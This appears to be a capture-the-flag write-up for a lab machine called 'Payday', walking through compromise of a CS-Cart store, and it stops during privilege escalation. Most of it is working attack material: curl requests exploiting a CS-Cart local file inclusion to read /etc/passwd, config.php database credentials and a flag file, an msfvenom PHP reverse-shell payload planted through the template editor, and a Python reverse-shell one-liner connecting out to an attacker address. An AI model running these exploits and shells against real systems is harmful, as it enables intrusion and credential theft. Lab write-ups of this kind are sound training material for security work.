# Payday

1. CSCart CVE allows for Remote code execution, and local.txt
2. su into patrick
3. patrick sudo has a lot of power, to easily obtain root access

# Enumeration

## nmap

```
┌──(root💀DESKTOP-61F9HO2)-[~]
└─# nmap  192.168.234.39 -p- -v                                                         Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-18 13:11 +08
Initiating Ping Scan at 13:11                                                           Scanning 192.168.234.39 [4 ports]
Completed Ping Scan at 13:11, 0.33s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:11
Completed Parallel DNS resolution of 1 host. at 13:11, 1.03s elapsed
Initiating SYN Stealth Scan at 13:11
Scanning 192.168.234.39 [65535 ports]
Discovered open port 139/tcp on 192.168.234.39
Discovered open port 995/tcp on 192.168.234.39                                          Discovered open port 993/tcp on 192.168.234.39                                          Discovered open port 143/tcp on 192.168.234.39
Discovered open port 445/tcp on 192.168.234.39
Discovered open port 22/tcp on 192.168.234.39
Discovered open port 80/tcp on 192.168.234.39                                           Discovered open port 110/tcp on 192.168.234.39
... 
SYN Stealth Scan Timing: About 86.91% done; ETC: 13:24 (0:01:42 remaining)
SYN Stealth Scan Timing: About 93.91% done; ETC: 13:23 (0:00:46 remaining)
Completed SYN Stealth Scan at 13:23, 743.26s elapsed (65535 total ports)
Nmap scan report for 192.168.234.39                                                     Host is up (0.25s latency).
Not shown: 65527 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 744.88 seconds
           Raw packets sent: 72656 (3.197MB) | Rcvd: 67657 (2.707MB)
┌──(root💀DESKTOP-61F9HO2)-[~]
└─# 
```

## 80 - Web - CS Cart

![](Pasted%20image%2020220123095830.png)

Web credentials is admin admin
https://forum.cs-cart.com/topic/4099-login-password-issue/

Using Lynx Web browser

```
←              CS-Cart. Powerful PHP shopping cart software - Privacy policy (p3 of 3)
   The personal information collected on this Site will be used to provide the
   services you have requested.
   We may use your personal information to provide you with important information
   about the product or service that you are using, including critical updates and
   notifications. Additionally, we may send you information about other CS-Cart
   products and services.
                                                                                           Questions:                                                                                                                                                                      If you have any questions about this Privacy Statement or concerns about the            way we process your Personal Data, please contact us using the Contact Us form.
   We may occasionally modify this privacy statement. All such changes will be             reflected on this web page.
          Authentication
   Admin Admin is logged in!

    My account                                                                              Log out
          Site news                                                                        Submit e-mail address to receive free updates and promotions

   Enter e-ma                                                                                  Home   |   About Us  |   Contact Us  |   Privacy policy  |   Site map

       Copyright © 2006 CS-Cart.com.
(NORMAL LINK) Use right-arrow or <return> to activate.
  Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.
 H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list
```

Copyright © 2006 CS-Cart.com.
https://forum.cs-cart.com/topic/1685-how-do-i-know-what-version-i-have/

LFI

https://www.exploit-db.com/exploits/48890


```
┌──(root💀DESKTOP-61F9HO2)-[/]
└─# curl '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../.
./../../../../../../../etc/passwd%00'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh                                                              sys:x:3:3:sys:/dev:/bin/sh                                                              sync:x:4:65534:sync:/bin:/bin/sync                                                      games:x:5:60:games:/usr/games:/bin/sh                                                   man:x:6:12:man:/var/cache/man:/bin/sh                                                   lp:x:7:7:lp:/var/spool/lpd:/bin/sh                                                      mail:x:8:8:mail:/var/mail:/bin/sh                                                       news:x:9:9:news:/var/spool/news:/bin/sh                                                 uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh                                               proxy:x:13:13:proxy:/bin:/bin/sh                                                        
www-data:x:33:33:www-data:/var/www:/bin/sh                                              backup:x:34:34:backup:/var/backups:/bin/sh                                              
list:x:38:38:Mailing List Manager:/var/list:/bin/sh                                     irc:x:39:39:ircd:/var/run/ircd:/bin/sh                                                  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh                 nobody:x:65534:65534:nobody:/nonexistent:/bin/sh                                        dhcp:x:100:101::/nonexistent:/bin/false                                                 syslog:x:101:102::/home/syslog:/bin/false                                               klog:x:102:103::/home/klog:/bin/false                                                   
mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false                               
dovecot:x:104:111:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false                    postfix:x:105:112::/var/spool/postfix:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin                                       patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
<br />
<b>Fatal error</b>:  Class 'PHPMailer' not found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>6</b><br />
┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─# 
┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─# curl '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=http://192.168.49.234/%00'                                                                        <br />
<b>Warning</b>:  require_once() [<a href='function.require-once'>function.require-once</a>]: URL file-access is disabled in the server configuration in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />
<br />
<b>Warning</b>:  require_once(http://192.168.49.234/) [<a href='function.require-once'>function.require-once</a>]: failed to open stream: no suitable wrapper could be found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />
<br />
<b>Fatal error</b>:  require_once() [<a href='function.require'>function.require</a>]: Failed opening required 'http://192.168.49.234/' (include_path='.:/usr/share/php:/usr/share/pear') in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />                                                                                    ┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─#
```

Exploits research

```
┌──(kali㉿localhost)-[/tmp]
└─$ searchsploit -m 48890
  Exploit: CS-Cart 1.3.3 - 'classes_dir' LFI
      URL: https://www.exploit-db.com/exploits/48890
     Path: /usr/share/exploitdb/exploits/php/webapps/48890.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /tmp/48890.txt



┌──(kali㉿localhost)-[/tmp]
└─$ cat 48890.txt
# Exploit Title: CS-Cart unauthenticated LFI
# Date: 2020-09-22
# Exploit Author:  0xmmnbassel
# Vendor Homepage: https://www.cs-cart.com/e-commerce-platform.html
# Tested at: ver. 1.3.4
# Vulnerability Type: unauthenticated LFI


http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=[evil_scripts]%00
example:
http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
http://www.site.com/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
┌──(kali㉿localhost)-[/tmp]
└─$ searchsploit cs-cart
------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ ---------------------------------
CS-Cart - Multiple SQL Injections                     | php/webapps/27030.txt
CS-Cart 1.3.2 - 'index.php' Cross-Site Scripting      | php/webapps/31443.txt
CS-Cart 1.3.3 - 'classes_dir' LFI                     | php/webapps/48890.txt
CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion   | php/webapps/1872.txt
CS-Cart 1.3.3 - 'install.php' Cross-Site Scripting    | multiple/webapps/14962.txt
CS-Cart 1.3.3 - authenticated RCE                     | php/webapps/48891.txt
CS-Cart 1.3.5 - Authentication Bypass                 | php/webapps/6352.txt
CS-Cart 2.0.0 Beta 3 - 'Product_ID' SQL Injection     | php/webapps/8184.txt
CS-Cart 2.0.5 - 'reward_points.post.php' SQL Injectio | php/webapps/33146.txt
CS-Cart 2.2.1 - 'products.php' SQL Injection          | php/webapps/36093.txt
CS-Cart 4.2.4 - Cross-Site Request Forgery            | php/webapps/36358.html
CS-Cart 4.3.10 - XML External Entity Injection        | php/webapps/40770.txt
------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(kali㉿localhost)-[/tmp]
└─$ searchsploit -m 1872
  Exploit: CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion
      URL: https://www.exploit-db.com/exploits/1872
     Path: /usr/share/exploitdb/exploits/php/webapps/1872.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /tmp/1872.txt



┌──(kali㉿localhost)-[/tmp]
└─$ cat 1872.txt
$$$$$$$$$$$$$$$ DEVIL TEAM THE BEST POLISH TEAM $$$$$$$$$$$$$$$
$$
$$  CS-Cart 1.3.3 (classes_dir) <= Remote File Include Vulnerability
$$  Script site: http://www.cs-cart.com
$$  Dork: Powered by CS-Cart - Shopping Cart Software
$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$
$$              Find by: Kacper (a.k.a Rahim)
$$
$$ Contact: kacper1964@yahoo.pl   or   http://www.devilteam.yum.pl
$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$
$$  Greetz: DragonHeart, Satan, Leito, Leon, Luzak,
$$           Adam, DeathSpeed, Drzewko, pepi
$$
$$  Specjal greetz: DragonHeart ;-)
$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

Expl:

http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=[evil_scripts]

#Pozdro dla wszystkich ;-)

# milw0rm.com [2006-06-03]
┌──(kali㉿localhost)-[/tmp]
└─$ 
```

Local

```
┌──(root💀DESKTOP-61F9HO2)-[/]                                                          
└─# curl '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../home/patrick/local.txt%00'                                       1ce3f0af025d277a6d3e664e6593778a                                                        
<br />
<b>Fatal error</b>:  Class 'PHPMailer' not found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>6</b><br />                                             
┌──(root💀DESKTOP-61F9HO2)-[/]
└─# 
```

More LFI Testing

```
┌──(root💀DESKTOP-61F9HO2)-[/]
└─# curl '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=php://filter/convert.base64-encode/resource=/etc/passwd%00'
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovYmluL3NoCmJpbjp4OjI6MjpiaW46L2JpbjovYmluL3NoCnN5czp4OjM6MzpzeXM6L2RldjovYmluL3NoCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L2Jpbi9zaAptYW46eDo2OjEyOm1hbjovdmFyL2NhY2hlL21hbjovYmluL3NoCmxwOng6Nzo3OmxwOi92YXIvc3Bvb2wvbHBkOi9iaW4vc2gKbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovYmluL3NoCm5ld3M6eDo5Ojk6bmV3czovdmFyL3Nwb29sL25ld3M6L2Jpbi9zaAp1dWNwOng6MTA6MTA6dXVjcDovdmFyL3Nwb29sL3V1Y3A6L2Jpbi9zaApwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L2Jpbi9zaAp3d3ctZGF0YTp4OjMzOjMzOnd3dy1kYXRhOi92YXIvd3d3Oi9iaW4vc2gKYmFja3VwOng6MzQ6MzQ6YmFja3VwOi92YXIvYmFja3VwczovYmluL3NoCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L2Jpbi9zaAppcmM6eDozOTozOTppcmNkOi92YXIvcnVuL2lyY2Q6L2Jpbi9zaApnbmF0czp4OjQxOjQxOkduYXRzIEJ1Zy1SZXBvcnRpbmcgU3lzdGVtIChhZG1pbik6L3Zhci9saWIvZ25hdHM6L2Jpbi9zaApub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi9iaW4vc2gKZGhjcDp4OjEwMDoxMDE6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCnN5c2xvZzp4OjEwMToxMDI6Oi9ob21lL3N5c2xvZzovYmluL2ZhbHNlCmtsb2c6eDoxMDI6MTAzOjovaG9tZS9rbG9nOi9iaW4vZmFsc2UKbXlzcWw6eDoxMDM6MTA3Ok15U1FMIFNlcnZlciwsLDovdmFyL2xpYi9teXNxbDovYmluL2ZhbHNlCmRvdmVjb3Q6eDoxMDQ6MTExOkRvdmVjb3QgbWFpbCBzZXJ2ZXIsLCw6L3Vzci9saWIvZG92ZWNvdDovYmluL2ZhbHNlCnBvc3RmaXg6eDoxMDU6MTEyOjovdmFyL3Nwb29sL3Bvc3RmaXg6L2Jpbi9mYWxzZQpzc2hkOng6MTA2OjY1NTM0OjovdmFyL3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCnBhdHJpY2s6eDoxMDAwOjEwMDA6cGF0cmljaywsLDovaG9tZS9wYXRyaWNrOi9iaW4vYmFzaAo=<br />                                                                                      <b>Fatal error</b>:  Class 'PHPMailer' not found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>6</b><br />                                             
┌──(root💀DESKTOP-61F9HO2)-[/]
└─#
┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─# curl '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=data://text/plain,aaaa%00'                                                                        <br />
<b>Warning</b>:  require_once() [<a href='function.require-once'>function.require-once</a>]: URL file-access is disabled in the server configuration in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />                                 <br />                                                                                  <b>Warning</b>:  require_once(data://text/plain,aaaa) [<a href='function.require-once'>function.require-once</a>]: failed to open stream: no suitable wrapper could be found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />         <br />                                                                                  <b>Fatal error</b>:  require_once() [<a href='function.require'>function.require</a>]: Failed opening required 'data://text/plain,aaaa' (include_path='.:/usr/share/php:/usr/share/pear') in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />                                                                                    ┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─#
┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─# curl '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../var/log/apache2/access.log%00'                                   <br />                                                                                  <b>Warning</b>:  require_once(../../../../../../../../../../../var/log/apache2/access.log) [<a href='function.require-once'>function.require-once</a>]: failed to open stream: Permission denied in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />                                                                             <br />                                                                                  <b>Fatal error</b>:  require_once() [<a href='function.require'>function.require</a>]: Failed opening required '../../../../../../../../../../../var/log/apache2/access.log' (include_path='.:/usr/share/php:/usr/share/pear') in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />                                               ┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─#
```


```
┌──(root💀DESKTOP-61F9HO2)-[/tmp]                                                       
└─# wfuzz -w list.txt '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../..FUZZ%00' > fuzz.txt                                   /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                                      ┌──(root💀DESKTOP-61F9HO2)-[/tmp]                                                       
└─# wget https://raw.githubusercontent.com/hussein98d/LFI-files/master/list.txt
```


```
┌──(kali㉿kali)-[/tmp]
└─$ curl '192.168.70.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=php://filter/convert.base64-encode/resource=../../config.php%00' | base64 -d | head -c 400
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11907    0<?php0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

//
// $Id: config.php 1822 2006-05-17 16:44:43Z
//

if ( !defined('IN_CSCART') ) { die('Access denied'); }

$db_host = 'localhost';
$db_name = 'cscart';
$db_user = 'root';
$db_password = 'root';

// Example: 
// Your url is http://www.yourcompany.com/store/cscart 
// cscart_http_host = 'www.yourcompany.com';
// cscart_http_dir = '/store/cscart';
//
100 15191    0 15191    0     0  16935      0 --:--:-- --:--:-- --:--:-- 16916-:-- --:--:-- --:--:-- 16865
(23) Failed writing body
                                                                                                                                                                        
┌──(kali㉿kali
```


Web Directory

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Payday]
└─$ curl '192.168.70.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=php://filter/convert.base64-encode/resource=/var/www/index.php%00'
PD9waHAKLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKgoqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqCiogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICoKKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKgoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqCiogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICoKKiBDUy1DYXJ0ICBpcyAgY29tbWVyY2lhbCAgc29mdHdhcmUsICBvbmx5ICB1c2VycyAgd2hvIGhhdmUgcHVyY2hhc2VkIGEgdmFsaWQgKgoqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqCiogTGljZW5zZSBBZ3JlZW1lbnQgY2FuIGluc3RhbGwgdGhpcyBwcm9kdWN0LiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICoKKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKgoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqCiogVEhJUyAgQ1MtQ0FSVCAgU0hPUCBFTkQtVVNFUiBMSUNFTlNFIEFHUkVFTUVOVCBJUyBBIExFR0FMIEFHUkVFTUVOVCBCRVRXRUVOICoKKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKgoqIFJFRkVSUkVEICBUTyAgQVMgICJUSEUgQVVUSE9SIikgIEZPUiBUSEUgU09GVFdBUkUgUFJPRFVDVCBJREVOVElGSUVEIEFCT1ZFLCAqCiogV0hJQ0ggSU5DTFVERVMgQ09NUFVURVIgIFNPRlRXQVJFIEFORCBNQVkgSU5DTFVERSBBU1NPQ0lBVEVEIE1FRElBLCBQUklOVEVEICoKKiBNQVRFUklBTFMsICBBTkQgICJPTkxJTkUiICBPUiAgRUxFQ1RST05JQyAgRE9DVU1FTlRBVElPTiAoQ09MTEVDVElWRUxZLCBUSEUgKgoqICJTT0ZUV0FSRSIpLiAgQlkgIFVTSU5HICBUSEUgIFNPRlRXQVJFLCAgWU9VICBTSUdOSUZZIFlPVVIgQUdSRUVNRU5UIFRPIEFMTCAqCiogVEVSTVMsIENPTkRJVElPTlMsIEFORCBOT1RJQ0VTIENPTlRBSU5FRCAgT1IgIFJFRkVSRU5DRUQgSEVSRUlOLiBJRiBZT1UgQVJFICoKKiBOT1QgIFdJTExJTkcgIFRPICBCRSAgQk9VTkQgIEJZICBUSElTICBBR1JFRU1FTlQsIERPIE5PVCBJTlNUQUxMIE9SIFVTRSBUSEUgKgoqIFNPRlRXQVJFLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqCiogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICoKKiBQTEVBU0UgUkVBRCBUSEUgRlVMTCAgVEVYVCBPRiBTT0ZUV0FSRSBMSUNFTlNFIEFHUkVFTUVOVCBJTiBUSEUgIkNPUFlSSUdIVCIgKgoqIEZJTEUgUFJPVklERUQgV0lUSCBUSElTICBESVNUUklCVVRJT04uIFRIRSBBR1JFRU1FTlQgVEVYVCBJUyBBTFNPIEFWQUlMQUJMRSAqCiogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICoKKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqLwoKLy8KLy8gJElkOiBpbmRleC5waHAgMTYwOSAyMDA2LTA0LTI4IDEzOjAwOjM4WgovLwoKLy9lcnJvcl9yZXBvcnRpbmcoRV9BTEwpOwoKREVGSU5FICgnQVJFQScsICdDJyk7CkRFRklORSAoJ0FSRUFfTkFNRScgLCdjdXN0b21lcicpOwoKcmVxdWlyZSAnLi9wcmVwYXJlLnBocCc7CmlmICghZW1wdHkoJGh0bWxfY2F0YWxvZykpICB7CglkZWZpbmUgKCdOT19TRVNTSU9OJywgdHJ1ZSk7Cn0KcmVxdWlyZSAnLi9pbml0LnBocCc7CgppZiAoIWVtcHR5KCRzZXR0aW5nc1snR2VuZXJhbCddWydzdG9yZV9hY2Nlc3Nfa2V5J10pKSB7CglzZXNzX3JlZ2lzdGVyKCdzdG9yZV9hY2Nlc3Nfa2V5Jyk7CglpZiAoIWVtcHR5KCRfR0VUWydzdG9yZV9hY2Nlc3Nfa2V5J10pKSB7CgkJJHN0b3JlX2FjY2Vzc19rZXkgPSAkX0dFVFsnc3RvcmVfYWNjZXNzX2tleSddOwoJfQoJaWYgKCRzdG9yZV9hY2Nlc3Nfa2V5ICE9ICRzZXR0aW5nc1snR2VuZXJhbCddWydzdG9yZV9hY2Nlc3Nfa2V5J10pIHsKCQlmbl9yZWRpcmVjdCgnc3RvcmVfY2xvc2VkLmh0bWwnKTsKCX0KfQovLyBDb252ZXJ0aW5nIHNjcmlwdCB2YXJzIHRvIHVzZSBpbiBIVE1MIGNhdGFsb2cgCmlmICghZW1wdHkoJGh0bWxfY2F0YWxvZykpICB7CgkkaW5kZXhfc2NyaXB0ID0gJGNzY2FydF9ob3N0X2RpciAuICcvJyAuICRjdXN0b21lcl9pbmRleDsKCSRpbWFnZV9pbmRleCA9ICRjc2NhcnRfaG9zdF9kaXIgLiAnLycgLiAkaW1hZ2VfaW5kZXg7CgkvLyBEaXNhYmxlIGFqYXggcGFnaW5hdGlvbiBkdXJpbmcgaHRtbCBjYXRhbG9nIGdlbmVyYXRpb24KCSRzZXR0aW5nc1snQXBwZWFyYW5jZSddWydjdXN0b21lcl9hamF4X2Jhc2VkX3BhZ2luYXRpb24nXSA9ICdOJzsKCSRzbWFydHktPmFzc2lnbignaW1hZ2VfaW5kZXgnLCAkaW1hZ2VfaW5kZXgpOwp9IGVsc2UgewoJJGluZGV4X3NjcmlwdCA9ICRjdXN0b21lcl9pbmRleDsKfQoKLy8KLy8gQ29tbW9uIGluY2x1ZGVzCi8vCmluY2x1ZGUgJGNvbW1vbl9kaXIuJ2N1c3RvbWVyX2NvbW1vbi5waHAnOwoKZm5fYWRkX2JyZWFkY3J1bWIoZm5fZ2V0X2xhbmdfdmFyKCdob21lJyksICRpbmRleF9zY3JpcHQpOwoKaWYgKGVtcHR5KCR0YXJnZXQpKSB7CiAgICAkdGFyZ2V0ID0gJ2luZGV4JzsKfQoKLy8KLy8gSW5jbHVkZSB0YXJnZXQgc2NyaXB0IGZyb20gJHNjcmlwdF90YXJnZXRzIGFycmF5Ci8vICAgICAgICAgICAKaWYgKGZpbGVfZXhpc3RzKEAkc2NyaXB0X3RhcmdldHNbJHRhcmdldF0pKSB7CiAgICBpbmNsdWRlICRzY3JpcHRfdGFyZ2V0c1skdGFyZ2V0XTsKfSBlbHNlIHsKCWZuX3NldF9leGNlcHRpb24oJ25vX3BhZ2UnKTsKfQoKJHNtYXJ0eS0+YXNzaWduKCdpbmRleF9zY3JpcHQnLCAkaW5kZXhfc2NyaXB0KTsKCmZuX3Nob3dfdGVtcGxhdGUoJ2luZGV4LnRwbCcsJHNtYXJ0eSwgdHJ1ZSk7Cj8+Cg==<br />
<b>Fatal error</b>:  Class 'PHPMailer' not found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>6</b><br />

```


# Exploit

Logged in with `admin`:`admin`, and it worked

![](Pasted%20image%2020220123135122.png)

https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c
https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c

Go to Template Editor on that page

![](Pasted%20image%2020220123135207.png)

Generate Payload

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p php/reverse_php LHOST=192.168.49.70 LPORT=443  -o shell.phtml
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3061 bytes
Saved as: shell.phtml
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

![](Pasted%20image%2020220123135442.png)

![](Pasted%20image%2020220123135501.png)

```
┌──(kali㉿kali)-[/tmp]
└─$ curl 'http://192.168.70.39/skins/shell.phtml' & sudo nc -nlvp 443                                                                                               1 ⨯
[1] 4780
listening on [any] 443 ...
connect to [192.168.49.70] from (UNKNOWN) [192.168.70.39] 41591
whoami
www-data
cd /home
ls
patrick
cd patrick
cat local.txt
7fd8b467d1ae7546d6b449467e10d6fb
ifconfig
/sbin/ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:BA:FA:AE  
          inet addr:192.168.70.39  Bcast:192.168.70.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feba:faae/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:325938 errors:22 dropped:22 overruns:0 frame:0
          TX packets:319921 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:42211938 (40.2 MB)  TX bytes:139141086 (132.6 MB)
          Interrupt:17 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:472 errors:0 dropped:0 overruns:0 frame:0
          TX packets:472 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1199394 (1.1 MB)  TX bytes:1199394 (1.1 MB)


```

![](Pasted%20image%2020220123135634.png)

## Upgrade shell
```
ls /usr/bin | grep python
python
python2.5
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.70",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443                               
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.49.70] from (UNKNOWN) [192.168.70.39] 47979
www-data@payday:/home/patrick$
```

## SSH access
```
www-data@payday:/var/www$ cat /etc/paddwd
cat /etc/paddwd
cat: /etc/paddwd: No such file or directory
www-data@payday:/var/www$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
dhcp:x:100:101::/nonexistent:/bin/false
syslog:x:101:102::/home/syslog:/bin/false
klog:x:102:103::/home/klog:/bin/false
mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false
dovecot:x:104:111:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
postfix:x:105:112::/var/spool/postfix:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
